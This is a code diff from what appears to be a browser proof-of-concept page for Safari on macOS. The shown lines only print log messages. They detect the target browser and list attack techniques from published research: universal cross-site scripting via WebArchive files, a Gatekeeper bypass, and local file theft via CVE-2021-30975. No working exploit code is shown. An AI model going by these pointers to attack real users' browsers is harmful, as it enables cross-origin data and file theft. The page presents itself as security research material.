+        log('output1', '🎯 TARGET DETECTED: Safari on macOS', 'warning');
+        log('output1', '⚠️ Original vulnerable versions: Safari 15, macOS Monterey < 12.1', 'warning');
+        log('output1', '💡 Current version may already be patched', 'info');
+    } else {
+        log('output1', 'ℹ️ Not running on vulnerable target', 'info');
+        log('output1', '💡 POC is for educational/research purposes', 'info');
     }
     
-    // Info about the vulnerability
-    log('output2', '💡 KEY INSIGHT from CVE-2011-2826:', 'info');
-    log('output2', '   about:blank window dengan opener = null memiliki SecurityOrigin kosong', 'info');
-    log('output2', '   Function object dari window ini bisa digunakan untuk akses cross-origin', 'info');
-    
-    updatePreview("Ready - Select an attack to begin");
+    log('output2', '💡 KEY INSIGHTS from Ryan Pickren\'s research:', 'info');
+    log('output2', '   - iCloud Sharing (ShareBear) polymorphic file attack', 'info');
+    log('output2', '   - WebArchive files specify arbitrary origin (UXSS by design)', 'info');
+    log('output2', '   - Gatekeeper bypass via .url files + DMG mount', 'info');
+    log('output2', '   - Script Editor OSX (CVE-2021-30975) for local file theft', 'info');
 </script>
 </body>
 </html>
